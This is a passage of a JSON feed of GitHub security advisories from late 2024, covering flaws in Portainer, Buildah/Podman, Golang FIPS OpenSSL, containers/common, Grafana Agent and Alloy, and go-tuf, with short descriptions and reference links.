            "content_html": "<p>Portainer before 2.20.2 improperly uses an encryption algorithm in the <code>AesEncrypt</code> function.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-33662\">https://nvd.nist.gov/vuln/detail/CVE-2024-33662</a></li>\n<li><a href=\"https://github.com/portainer/portainer/issues/11737\">https://github.com/portainer/portainer/issues/11737</a></li>\n<li><a href=\"https://github.com/portainer/portainer/compare/2.20.1...2.20.2\">https://github.com/portainer/portainer/compare/2.20.1...2.20.2</a></li>\n<li><a href=\"https://www.portainer.io\">https://www.portainer.io</a></li>\n<li><a href=\"https://github.com/search?q=repo%3Aportainer%2Fportainer+EE-6764&amp;type=pullrequests\">https://github.com/search?q=repo%3Aportainer%2Fportainer+EE-6764&amp;type=pullrequests</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9mjw-79r6-c9m8\">https://github.com/advisories/GHSA-9mjw-79r6-c9m8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9mjw-79r6-c9m8",
            "title": "[github.com/portainer/portainer] Portainer improperly uses an encryption algorithm in the AesEncrypt function",
            "date_modified": "2024-10-02T17:58:15.000Z",
            "date_published": "2024-10-02T06:30:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9mjw-79r6-c9m8"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A vulnerability exists in the bind-propagation option of the Dockerfile RUN --mount instruction. The system does not properly validate the input passed to this option, allowing users to pass arbitrary parameters to the mount instruction. This issue can be exploited to mount sensitive directories from the host into a container during the build process and, in some cases, modify the contents of those mounted files. Even if SELinux is used, this vulnerability can bypass its protection by allowing the source directory to be relabeled to give the container access to host files.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-9407\">https://nvd.nist.gov/vuln/detail/CVE-2024-9407</a></li>\n<li><a href=\"https://access.redhat.com/security/cve/CVE-2024-9407\">https://access.redhat.com/security/cve/CVE-2024-9407</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=2315887\">https://bugzilla.redhat.com/show_bug.cgi?id=2315887</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-fhqq-8f65-5xfc\">https://github.com/advisories/GHSA-fhqq-8f65-5xfc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-fhqq-8f65-5xfc",
            "title": "[github.com/containers/podman/v5] Improper Input Validation in Buildah and Podman",
            "date_modified": "2024-10-01T22:32:08.000Z",
            "date_published": "2024-10-01T21:31:35.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-fhqq-8f65-5xfc"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A vulnerability exists in the bind-propagation option of the Dockerfile RUN --mount instruction. The system does not properly validate the input passed to this option, allowing users to pass arbitrary parameters to the mount instruction. This issue can be exploited to mount sensitive directories from the host into a container during the build process and, in some cases, modify the contents of those mounted files. Even if SELinux is used, this vulnerability can bypass its protection by allowing the source directory to be relabeled to give the container access to host files.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-9407\">https://nvd.nist.gov/vuln/detail/CVE-2024-9407</a></li>\n<li><a href=\"https://access.redhat.com/security/cve/CVE-2024-9407\">https://access.redhat.com/security/cve/CVE-2024-9407</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=2315887\">https://bugzilla.redhat.com/show_bug.cgi?id=2315887</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-fhqq-8f65-5xfc\">https://github.com/advisories/GHSA-fhqq-8f65-5xfc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-fhqq-8f65-5xfc",
            "title": "[github.com/containers/buildah] Improper Input Validation in Buildah and Podman",
            "date_modified": "2024-10-01T22:32:08.000Z",
            "date_published": "2024-10-01T21:31:35.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-fhqq-8f65-5xfc"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A vulnerability was found in Golang FIPS OpenSSL. This flaw allows a malicious user to randomly cause an uninitialized buffer length variable with a zeroed buffer to be returned in FIPS mode. It may also be possible to force a false positive match between non-equal hashes when comparing a trusted computed hmac sum to an untrusted input sum if an attacker can send a zeroed buffer in place of a pre-computed sum.&nbsp; It is also possible to force a derived key to be all zeros instead of an unpredictable value.&nbsp; This may have follow-on implications for the Go TLS stack.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-9355\">https://nvd.nist.gov/vuln/detail/CVE-2024-9355</a></li>\n<li><a href=\"https://access.redhat.com/security/cve/CVE-2024-9355\">https://access.redhat.com/security/cve/CVE-2024-9355</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=2315719\">https://bugzilla.redhat.com/show_bug.cgi?id=2315719</a></li>\n<li><a href=\"https://access.redhat.com/errata/RHSA-2024:7502\">https://access.redhat.com/errata/RHSA-2024:7502</a></li>\n<li><a href=\"https://access.redhat.com/errata/RHSA-2024:7550\">https://access.redhat.com/errata/RHSA-2024:7550</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3h3x-2hwv-hr52\">https://github.com/advisories/GHSA-3h3x-2hwv-hr52</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3h3x-2hwv-hr52",
            "title": "[github.com/golang-fips/openssl/v2] Golang FIPS OpenSSL has a Use of Uninitialized Variable vulnerability",
            "date_modified": "2024-10-03T03:32:15.000Z",
            "date_published": "2024-10-01T21:31:34.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3h3x-2hwv-hr52"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A flaw was found in Go. When FIPS mode is enabled on a system, container runtimes may incorrectly handle certain file paths due to improper validation in the containers/common Go library. This flaw allows an attacker to exploit symbolic links and trick the system into mounting sensitive host directories inside a container. This issue also allows attackers to access critical host files, bypassing the intended isolation between containers and the host system.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-9341\">https://nvd.nist.gov/vuln/detail/CVE-2024-9341</a></li>\n<li><a href=\"https://access.redhat.com/security/cve/CVE-2024-9341\">https://access.redhat.com/security/cve/CVE-2024-9341</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=2315691\">https://bugzilla.redhat.com/show_bug.cgi?id=2315691</a></li>\n<li><a href=\"https://github.com/containers/common/blob/384f77532f67afc8a73d8e0c4adb0d195df57714/pkg/subscriptions/subscriptions.go#L169\">https://github.com/containers/common/blob/384f77532f67afc8a73d8e0c4adb0d195df57714/pkg/subscriptions/subscriptions.go#L169</a></li>\n<li><a href=\"https://github.com/containers/common/blob/384f77532f67afc8a73d8e0c4adb0d195df57714/pkg/subscriptions/subscriptions.go#L349\">https://github.com/containers/common/blob/384f77532f67afc8a73d8e0c4adb0d195df57714/pkg/subscriptions/subscriptions.go#L349</a></li>\n<li><a href=\"https://github.com/containers/common/commit/e7db06585c32e1a782c1d9aa3b71ccd708f5e23f\">https://github.com/containers/common/commit/e7db06585c32e1a782c1d9aa3b71ccd708f5e23f</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mc76-5925-c5p6\">https://github.com/advisories/GHSA-mc76-5925-c5p6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mc76-5925-c5p6",
            "title": "[github.com/containers/common] Link Following in github.com/containers/common",
            "date_modified": "2024-10-01T22:31:14.000Z",
            "date_published": "2024-10-01T21:31:34.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mc76-5925-c5p6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Unquoted Search Path or Element vulnerability in Grafana Agent (Flow mode) on Windows allows Privilege Escalation from Local User to SYSTEM.\nThis issue affects Agent Flow before 0.43.3.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-8996\">https://nvd.nist.gov/vuln/detail/CVE-2024-8996</a></li>\n<li><a href=\"https://github.com/grafana/agent/releases/tag/v0.43.2\">https://github.com/grafana/agent/releases/tag/v0.43.2</a></li>\n<li><a href=\"https://grafana.com/blog/2024/09/25/grafana-alloy-and-grafana-agent-flow-security-release-high-severity-fix-for-cve-2024-8975-and-cve-2024-8996\">https://grafana.com/blog/2024/09/25/grafana-alloy-and-grafana-agent-flow-security-release-high-severity-fix-for-cve-2024-8975-and-cve-2024-8996</a></li>\n<li><a href=\"https://grafana.com/security/security-advisories/cve-2024-8996\">https://grafana.com/security/security-advisories/cve-2024-8996</a></li>\n<li><a href=\"https://github.com/grafana/agent/releases/tag/v0.43.3\">https://github.com/grafana/agent/releases/tag/v0.43.3</a></li>\n<li><a href=\"https://github.com/grafana/agent/commit/91bab2c05906938d3f8e1e3c61a863f037985299\">https://github.com/grafana/agent/commit/91bab2c05906938d3f8e1e3c61a863f037985299</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-m5gv-m5f9-wgv4\">https://github.com/advisories/GHSA-m5gv-m5f9-wgv4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-m5gv-m5f9-wgv4",
            "title": "[github.com/grafana/agent] Grafana Agent (Flow mode) on Windows has Unquoted Search Path or Element vulnerability",
            "date_modified": "2024-10-01T22:29:14.000Z",
            "date_published": "2024-09-25T18:31:21.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-m5gv-m5f9-wgv4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Unquoted Search Path or Element vulnerability in Grafana Alloy on Windows allows Privilege Escalation from Local User to SYSTEM.\nThis issue affects Alloy: before 1.3.4, from 1.4.0-rc.0 and prior to 1.4.1.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-8975\">https://nvd.nist.gov/vuln/detail/CVE-2024-8975</a></li>\n<li><a href=\"https://github.com/grafana/alloy/releases/tag/v1.4.0\">https://github.com/grafana/alloy/releases/tag/v1.4.0</a></li>\n<li><a href=\"https://grafana.com/blog/2024/09/25/grafana-alloy-and-grafana-agent-flow-security-release-high-severity-fix-for-cve-2024-8975-and-cve-2024-8996\">https://grafana.com/blog/2024/09/25/grafana-alloy-and-grafana-agent-flow-security-release-high-severity-fix-for-cve-2024-8975-and-cve-2024-8996</a></li>\n<li><a href=\"https://grafana.com/security/security-advisories/cve-2024-8975\">https://grafana.com/security/security-advisories/cve-2024-8975</a></li>\n<li><a href=\"https://github.com/grafana/alloy/releases/tag/v1.3.4\">https://github.com/grafana/alloy/releases/tag/v1.3.4</a></li>\n<li><a href=\"https://github.com/grafana/alloy/releases/tag/v1.4.1\">https://github.com/grafana/alloy/releases/tag/v1.4.1</a></li>\n<li><a href=\"https://github.com/grafana/alloy/commit/88e779887690954c009503598a3f4bf563cb6596\">https://github.com/grafana/alloy/commit/88e779887690954c009503598a3f4bf563cb6596</a></li>\n<li><a href=\"https://github.com/grafana/alloy/commit/f14249012fd970d3fd73604e6fff9b6c7990a9bb\">https://github.com/grafana/alloy/commit/f14249012fd970d3fd73604e6fff9b6c7990a9bb</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-chqx-36rm-rf8h\">https://github.com/advisories/GHSA-chqx-36rm-rf8h</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-chqx-36rm-rf8h",
            "title": "[github.com/grafana/alloy] Grafana Alloy on Windows has Unquoted Search Path or Element vulnerability",
            "date_modified": "2024-10-01T22:29:03.000Z",
            "date_published": "2024-09-25T18:31:21.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-chqx-36rm-rf8h"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Unquoted Search Path or Element vulnerability in Grafana Alloy on Windows allows Privilege Escalation from Local User to SYSTEM.\nThis issue affects Alloy: before 1.3.4, from 1.4.0-rc.0 and prior to 1.4.1.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-8975\">https://nvd.nist.gov/vuln/detail/CVE-2024-8975</a></li>\n<li><a href=\"https://github.com/grafana/alloy/releases/tag/v1.4.0\">https://github.com/grafana/alloy/releases/tag/v1.4.0</a></li>\n<li><a href=\"https://grafana.com/blog/2024/09/25/grafana-alloy-and-grafana-agent-flow-security-release-high-severity-fix-for-cve-2024-8975-and-cve-2024-8996\">https://grafana.com/blog/2024/09/25/grafana-alloy-and-grafana-agent-flow-security-release-high-severity-fix-for-cve-2024-8975-and-cve-2024-8996</a></li>\n<li><a href=\"https://grafana.com/security/security-advisories/cve-2024-8975\">https://grafana.com/security/security-advisories/cve-2024-8975</a></li>\n<li><a href=\"https://github.com/grafana/alloy/releases/tag/v1.3.4\">https://github.com/grafana/alloy/releases/tag/v1.3.4</a></li>\n<li><a href=\"https://github.com/grafana/alloy/releases/tag/v1.4.1\">https://github.com/grafana/alloy/releases/tag/v1.4.1</a></li>\n<li><a href=\"https://github.com/grafana/alloy/commit/88e779887690954c009503598a3f4bf563cb6596\">https://github.com/grafana/alloy/commit/88e779887690954c009503598a3f4bf563cb6596</a></li>\n<li><a href=\"https://github.com/grafana/alloy/commit/f14249012fd970d3fd73604e6fff9b6c7990a9bb\">https://github.com/grafana/alloy/commit/f14249012fd970d3fd73604e6fff9b6c7990a9bb</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-chqx-36rm-rf8h\">https://github.com/advisories/GHSA-chqx-36rm-rf8h</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-chqx-36rm-rf8h",
            "title": "[github.com/grafana/alloy] Grafana Alloy on Windows has Unquoted Search Path or Element vulnerability",
            "date_modified": "2024-10-01T22:29:03.000Z",
            "date_published": "2024-09-25T18:31:21.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-chqx-36rm-rf8h"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>During the ongoing work on the TUF conformance test suite, we have come across a test that reveals what we believe is a bug in go-tuf with security implications. The bug exists in go-tuf delegation tracing and could result in downloading the wrong artifact. </p>\n<p>We have come across this issue in the test in this PR: <a href=\"https://github.com/theupdateframework/tuf-conformance/pull/115\">https://github.com/theupdateframework/tuf-conformance/pull/115</a>.</p>\n<p>The test - <code>test_graph_traversal</code> - sets up a repository with a series of delegations, invokes the clients <code>refresh()</code> and then checks the order in which the client traced the delegations. The test shows that the go-tuf client inconsistently traces the delegations in a wrong way. For example, <a href=\"https://github.com/theupdateframework/tuf-conformance/pull/115#issuecomment-2275625542\">during one CI run</a>, the <code>two-level-delegations</code> test case triggered a wrong order. The delegations in this look as such:</p>\n<pre><code class=\"language-python\">\"two-level-delegations\": DelegationsTestCase(\n        delegations=[\n            DelegationTester(\"targets\", \"A\"),\n            DelegationTester(\"targets\", \"B\"),\n            DelegationTester(\"B\", \"C\"),\n        ],\n        visited_order=[\"A\", \"B\", \"C\"],\n    ),\n</code></pre>\n<p>Here, <code>targets</code> delegate to <code>\"A\"</code>, and to <code>\"B\"</code>, and <code>\"B\"</code> delegates to <code>\"C\"</code>. The client should trace the delegations in the order <code>\"A\"</code> then <code>\"B\"</code> then <code>\"C\"</code> but in this particular CI run, go-tuf traced the delegations <code>\"B\"-&gt;\"C\"-&gt;\"A\"</code>.</p>\n<p>In a subsequent CI run, this test case did not fail, but <a href=\"https://github.com/theupdateframework/tuf-conformance/pull/115#issuecomment-2275640487\">another one did</a>.</p>\n<p>@jku has done a bit of debugging and believes that the returned map of <code>GetRolesForTarget</code> returns a map that causes this behavior:</p>\n<p><a href=\"https://github.com/theupdateframework/go-tuf/blob/f95222bdd22d2ac4e5b8ed6fe912b645e213c3b5/metadata/metadata.go#L565-L580\">https://github.com/theupdateframework/go-tuf/blob/f95222bdd22d2ac4e5b8ed6fe912b645e213c3b5/metadata/metadata.go#L565-L580</a></p>\n<p>We believe that this map should be an ordered list instead of a map.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/theupdateframework/go-tuf/security/advisories/GHSA-4f8r-qqr9-fq8j\">https://github.com/theupdateframework/go-tuf/security/advisories/GHSA-4f8r-qqr9-fq8j</a></li>\n<li><a href=\"https://github.com/theupdateframework/tuf-conformance/pull/115\">https://github.com/theupdateframework/tuf-conformance/pull/115</a></li>\n<li><a href=\"https://github.com/theupdateframework/go-tuf/commit/f36420caba9edbfdfd64f95a9554c0836d9cf819\">https://github.com/theupdateframework/go-tuf/commit/f36420caba9edbfdfd64f95a9554c0836d9cf819</a></li>\n<li><a href=\"https://github.com/theupdateframework/go-tuf/blob/f95222bdd22d2ac4e5b8ed6fe912b645e213c3b5/metadata/metadata.go#L565-L580\">https://github.com/theupdateframework/go-tuf/blob/f95222bdd22d2ac4e5b8ed6fe912b645e213c3b5/metadata/metadata.go#L565-L580</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-47534\">https://nvd.nist.gov/vuln/detail/CVE-2024-47534</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4f8r-qqr9-fq8j\">https://github.com/advisories/GHSA-4f8r-qqr9-fq8j</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4f8r-qqr9-fq8j",
            "title": "[github.com/theupdateframework/go-tuf/v2] Incorrect delegation lookups can make go-tuf download the wrong artifact",
            "date_modified": "2024-10-01T18:37:40.000Z",
            "date_published": "2024-10-01T18:13:25.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4f8r-qqr9-fq8j"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}